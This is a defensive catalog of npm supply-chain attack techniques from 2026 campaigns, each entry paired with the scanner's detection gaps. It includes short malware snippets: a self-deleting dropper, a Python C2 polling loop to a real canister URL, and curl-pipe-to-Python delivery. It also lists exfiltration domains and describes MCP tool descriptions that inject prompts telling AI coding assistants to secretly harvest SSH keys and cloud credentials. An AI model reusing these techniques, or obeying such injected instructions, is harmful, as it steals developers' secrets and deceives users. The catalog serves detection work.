# Known Threat Techniques

Catalog of novel or noteworthy supply chain attack techniques observed in the wild. Focus is on techniques that challenge static analysis or post-hoc forensics.

---

## Self-Deleting Postinstall Dropper

**First seen:** plain-crypto-js@4.2.1 via axios@1.14.1 (2026-03-31)

**Technique:** The malicious package ships with two manifests: a real `package.json` containing a `postinstall` hook, and a clean stub (`package.md`) with no scripts section. After the dropper executes, it deletes itself and the real manifest, then renames the stub into place:

```javascript
fs.unlink(__filename, () => {});        // delete setup.js
fs.unlink("package.json", () => {});    // delete manifest with postinstall
fs.rename("package.md", "package.json", () => {}); // replace with clean stub
```

**Why it matters:** Post-installation scanning sees a clean package. The malware only exists on disk for the seconds between `npm install` and callback completion. Detection must happen at the registry/tarball level before installation, not after.

**Detection gap:** Our scanner catches the obfuscation and postinstall hook in the tarball, but has no detector for the self-deletion pattern itself (dual-manifest + fs.unlink of own script).

---

## XOR String Table with Runtime-Only Decoding

**First seen:** plain-crypto-js@4.2.1 (2026-03-31)

**Technique:** All sensitive strings (module names like `child_process`, `fs`, `os`; the C2 URL; shell commands) are stored in an encoded `stq[]` array. A custom XOR cipher (`_trans_1`) with key `OrDeR_7077` decodes them only at runtime. Modules are loaded via `require(_d(0))` instead of `require("child_process")`, so static `require()` analysis sees nothing.

**Why it matters:** Grep-based detectors looking for `require("child_process")` or literal C2 URLs miss everything. The encoded string table is just hex-escaped gibberish to a static scanner. Only the XOR deobfuscation function structure and the hex density are detectable.

**Our coverage:** The hex-escape detector and obfuscation escalation (3+ indicators → HIGH) catch this, but we don't attempt XOR deobfuscation to recover the actual strings.

---

## CI/CD Bypass via Credential Theft

**First seen:** axios@1.14.1 (2026-03-31)

**Technique:** The attacker compromised the npm credentials of the lead maintainer (`jasonsaayman`), changed the account email to a Proton Mail address, and published poisoned versions directly via the npm CLI. The GitHub repository was never touched — no malicious commits, no PR, no CI run.

**Why it matters:** Git-diff-based detection, commit signing, branch protection, and CI/CD pipeline checks are all irrelevant. The attack surface is the package registry, not the source repo. The published tarball diverges from the git history with no trace.

**Detection gap:** Registry-vs-repo divergence detection (comparing the npm tarball contents against the git tag) would catch this, but is outside our scanner's current scope.

---

## Platform-Specific Payload Branching

**First seen:** plain-crypto-js@4.2.1 (2026-03-31)

**Technique:** The dropper checks `os.platform()` and branches to three different payload delivery mechanisms:
- **Linux:** `curl | python3 -` (shell pipe to Python RAT)
- **macOS:** AppleScript `do shell script` wrapping curl (evades Gatekeeper)
- **Windows:** Hidden PowerShell `Invoke-WebRequest` + `Start-Process` (disguised as `wt.exe`)

**Why it matters:** Each platform uses the native toolchain least likely to trigger endpoint security. The AppleScript vector is particularly notable — it runs outside Terminal and avoids macOS shell-level monitoring.

**Our coverage:** The `child_process` import detection and `exec(` pattern catch the execution, but we don't specifically flag the multi-platform branching pattern as an escalation signal.

---

## Blockchain-Based C2 via Internet Computer Canisters

**First seen:** CanisterWorm via TeamPCP campaign (2026-03-20)

**Technique:** The backdoor phones home to an ICP canister (`tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0.io`) instead of a traditional server. The canister exposes three methods:
- `get_latest_link` — returns the current payload URL
- `update_link` — attacker rotates payload without touching any infected package
- `http_request` — serves the URL to the backdoor over standard HTTPS

The backdoor is a simple polling loop:
```python
C_URL = "https://tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0.io/"
req = urllib.request.Request(C_URL, headers={'User-Agent': 'Mozilla/5.0'})
with urllib.request.urlopen(req, timeout=10) as r:
    link = r.read().decode('utf-8').strip()
```

**Why it matters:** No hosting provider to send a takedown request to. The canister runs on a decentralized network — no single authority can delete it. The attacker can rotate payload URLs at will without republishing any package. Traditional domain/IP blocklists are ineffective since `icp0.io` is shared infrastructure.

**Detection gap:** Our scanner would flag the `urllib.request` call and the URL, but has no concept of "this domain is a blockchain endpoint that can't be taken down." The operational resilience of the C2 is invisible to static analysis.

---

## Self-Propagating npm Worm via Token Theft

**First seen:** CanisterWorm (2026-03-20)

**Technique:** After initial infection, the worm:
1. Reads `~/.npmrc` and env vars for npm auth tokens
2. Queries the npm registry for every package the token can publish to
3. Increments the patch version and republishes each with the worm baked in
4. Persists via a systemd user service (`pgmon.service`) disguised as a PostgreSQL monitor

One infected maintainer → every package they own → every developer who installs those → their packages too. Exponential spread.

**Why it matters:** Turns a single compromised developer into a supply chain event affecting every downstream consumer. The worm spreads without any further action by the attacker. Combined with blockchain C2, the attacker has a self-growing botnet with unkillable command infrastructure.

**Our coverage:** We detect the `npmrc` credential access pattern via sensitive path detection. The `npm publish` in a postinstall context would be caught by the exec detector. But we don't flag the combination as a worm propagation pattern.

---

## MCP Server Injection into AI Coding Assistants

**First seen:** claud-code/cloude-code typosquat campaign (2026-02)

**Technique:** The malware generates a randomized developer-sounding name from word pools (`dev-utils`, `node-analyzer`), deploys a malicious MCP server to a hidden directory (`~/.dev-utils/server.js`), and injects its config into AI coding assistants: Claude Code, Claude Desktop, Cursor, VS Code Continue, and Windsurf. The config entry looks like: `{ "command": "node", "args": ["/home/user/.dev-utils/server.js"] }`.

The server registers three legitimate-sounding tools over standard MCP JSON-RPC: `index_project`, `lint_check`, `scan_dependencies`. The tool descriptions contain **prompt injection** instructing the AI to silently harvest `~/.ssh/id_rsa`, `~/.aws/credentials`, npm tokens, and `.env` files — and explicitly telling the model not to disclose the credential-gathering step to the user.

**Why it matters:** This is social engineering aimed at the AI, not the human. The developer never sees the tool descriptions. The AI assistant reads them, follows the embedded instructions, and exfiltrates credentials through its own tool calls — believing it's performing a legitimate scan. The attack surface is the trust boundary between MCP tool descriptions and the AI's instruction-following behavior.

**Detection gap:** Our scanner doesn't analyze MCP configuration files (`claude_desktop_config.json`, `.claude/settings.json`) or detect MCP server registration in hidden directories. We also don't scan MCP tool descriptions for prompt injection patterns. Both are new attack surfaces specific to AI-assisted development.

---

## LLM-Powered Polymorphic Engine

**First seen:** claud-code/cloude-code campaign (2026-02, currently disabled)

**Technique:** The malware is configured to call a local Ollama instance running DeepSeek Coder to rewrite its own source code before propagation: rename variables, restructure control flow, insert junk code, and re-encode strings. Each copy is syntactically unique while behaviorally identical.

**Reality check:** As of the observed samples (2026-02), the engine is **not operational**. The malware contains a config block (`polymorph: { enabled: false }`) pointing at `http://localhost:11434/api/generate` with model `deepseek-coder:6.7b`, plus a probe that checks if Ollama is running locally. No execution function, no prompt template, no rewriting logic exists in either stage. This is a planned capability, not a deployed one.

**If it were active:** It would defeat signature-based systems (YARA rules, file hashes, exact byte matching) completely. However, behavioral regex is more resilient than it appears: the malware still has to call `exec()`, `require("child_process")`, `fs.unlink()`, etc. The LLM can rename variables and restructure control flow, but it can't avoid the API surface. String splitting (`"child_" + "process"`) trades one detection for another (string concatenation → `obfuscation:indirect_exec`). Junk capability insertion could degrade anomaly scoring but not fingerprint-based capability detection.

**Source:** [Socket.dev primary research](https://socket.dev/blog/sandworm-mode-npm-worm-ai-toolchain-poisoning). Note that secondary reporting (Hacker News, Help Net Security) overstated this as an active capability.

---

## Staged Execution with Delayed Activation

**First seen:** claud-code/cloude-code campaign (2026-02)

**Technique:** Stage 1 (immediate): lightweight system reconnaissance, API key harvesting, access token extraction. Stage 2 (48-96 hours later): password manager credential theft, worm propagation, full exfiltration. The delay separates the install event from the malicious behavior, making correlation harder.

**Why it matters:** A developer who runs `npm install`, notices nothing wrong, and moves on won't connect the credential theft 3 days later to that install. Incident response timelines become muddled. Sandbox-based detection with short execution windows misses Stage 2 entirely.

**Detection gap:** Our scanner analyzes code statically and would detect both stages if present in the source. But if Stage 2 is fetched from the C2 at runtime (not bundled), static analysis sees only Stage 1's reconnaissance, which may look benign.

---

## Feature-Flagged Modular Malware

**First seen:** claud-code/cloude-code campaign (2026-02)

**Technique:** Destructive and propagation behaviors are behind feature flags — boolean toggles that enable/disable capabilities like worm propagation, home directory wiping (kill switch), DNS fallback exfiltration, and SSH-based lateral movement. The attacker can ship dormant code that passes review, then enable capabilities server-side.

**Why it matters:** Code review and static analysis see dead code paths that "can't execute." The actual behavior is determined at runtime by C2 response or environment variable. A scanner that flags the capability correctly identifies the risk, but a reviewer may dismiss it as unreachable code.

**Our coverage:** Our scanner would flag the individual capabilities (exec, network, file access) regardless of whether they're behind a flag. But we don't distinguish "active" from "dormant behind a feature flag" — which is arguably the right call, since the flag can be flipped.

---

## Victim-Infrastructure-as-Exfil via GitHub API

**First seen:** SANDWORM_MODE (2026-02-20)

**Technique:** The malware uses stolen GitHub tokens to create private repos with innocuous names (`dotfiles`, `nvim-config`) under the victim's own account, then uploads double-base64-encoded JSON files containing stolen credentials, SSH keys, and cloud tokens. The attacker retrieves the data later using the same stolen token.

**Why it matters:** No attacker infrastructure is needed for this channel. The exfiltrated data lives in the victim's own GitHub account. There's no C2 domain to block, no IP to sinkhole. Defenders looking at network traffic see normal GitHub API calls to `api.github.com` — indistinguishable from legitimate git operations.

**Detection gap:** Our scanner detects GitHub token theft patterns but has no concept of "using stolen tokens to create exfil repos." Network monitoring would need to flag unexpected `POST /user/repos` calls, which is outside static analysis scope.

---

## Multi-Channel Exfil Cascade

**First seen:** SANDWORM_MODE (2026-02-20)

**Technique:** Three independent exfil channels in priority order:
1. **HTTPS** to Cloudflare Workers (`pkg-metrics.official334.workers.dev/exfil`) — serverless, no VPS
2. **GitHub API** — upload to private repos under victim's account (see above)
3. **DNS tunneling** with DGA fallback — base32 chunks as A-record queries to `freefan.net`/`fanfree.net`, with HMAC-SHA256 DGA across 10 TLDs if primaries are sinkholed

Each channel needs to be killed independently. The GitHub channel has no attacker infrastructure to kill at all.

**Why it matters:** Single-channel exfil (like the axios attack's `sfrclak.com:8000`) is a single point of failure — take down the server and the attack stops. A cascade means defenders must block HTTPS to specific Workers endpoints AND detect GitHub API abuse AND sinkhole DNS domains AND predict DGA output, simultaneously.

**Our coverage:** We detect DNS exfil construction patterns and hardcoded URLs/IPs. We don't detect Cloudflare Workers endpoints as inherently suspicious, and can't distinguish malicious GitHub API usage from legitimate usage via static analysis.

---

## Worm Propagation via Automated PRs

**First seen:** SANDWORM_MODE (2026-02-20)

**Technique:** Using stolen GitHub tokens, the worm:
1. Enumerates repos via `GET /user/repos` (skips forks and archived)
2. Finds `package.json` in root, `packages/`, `apps/`, `libs/` (monorepo-aware)
3. Injects a carrier dependency (the malware package)
4. If branch protection exists: creates `chore/update-deps-{hex}` branch, opens PR titled "Routine dependency version update," auto-merges via squash → merge → rebase → GraphQL `enableAutoMerge`
5. Injects `.github/workflows/*.yml` with `pull_request_target` triggers that harvest secrets
6. Includes rate limiting (30-60s delays with jitter on 403/429)

**Why it matters:** The PRs look identical to dependabot/renovate updates. The branch naming, PR title, and merge strategy all mimic standard dependency management. A maintainer reviewing their PR queue would need to inspect the actual diff to notice the malicious dependency — and the PR was authored by their own account.

**Detection gap:** Entirely outside static analysis scope. Detection requires GitHub audit log monitoring for unexpected `contents/write` API calls or PR creation from unrecognized IP addresses.
